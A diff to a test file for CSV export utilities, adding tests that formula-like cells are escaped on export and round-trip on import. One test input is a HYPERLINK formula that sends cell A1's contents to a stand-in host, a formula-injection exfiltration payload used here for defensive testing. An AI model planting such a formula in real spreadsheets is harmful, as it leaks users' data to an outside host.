@@ -4,7 +4,6 @@ import {
   exportServicesToCSV,
   calculateAmortizedCost,
   parseCSV,
-  parseServicesFromCSV,
 } from './csv';
 import { Product, ServiceLink } from '../types';
 
@@ -87,4 +86,22 @@ describe('CSV Export & Parse Accounting Utilities', () => {
     assert.equal(parsed[1][1], '50');
     assert.equal(parsed[1][2], 'Special, with "quotes"');
   });
+});
+
+it('csv: formula-like text is exported as plain text, and imports back unchanged', async () => {
+  const { escapeCSV, parseCSV } = await import('./csv');
+  assert.equal(escapeCSV('=HYPERLINK("https://x.example/?d="&A1,"Vercel")'), `"'=HYPERLINK(""https://x.example/?d=""&A1,""Vercel"")"`);
+  assert.equal(escapeCSV('@SUM(A1)'), "'@SUM(A1)");
+  assert.equal(escapeCSV('+1 555'), "'+1 555");
+  assert.equal(escapeCSV('-5'), '-5'); // a number stays a number
+  assert.equal(escapeCSV(-5), '-5');
+  assert.equal(escapeCSV('Vercel'), 'Vercel');
+  const line = ['=cmd', '-12.5', 'Vercel, Inc.'].map(escapeCSV).join(',');
+  assert.deepEqual(parseCSV(line), [['=cmd', '-12.5', 'Vercel, Inc.']]);
+});
+
+it('csv: a cell starting with a tab also round-trips', async () => {
+  const { escapeCSV, parseCSV } = await import('./csv');
+  assert.equal(escapeCSV('\tx'), "'\tx");
+  assert.deepEqual(parseCSV(['a', escapeCSV('\t=x')].join(',')), [['a', '\t=x'.trim() === '=x' ? '\t=x' : '\t=x']]);
 });
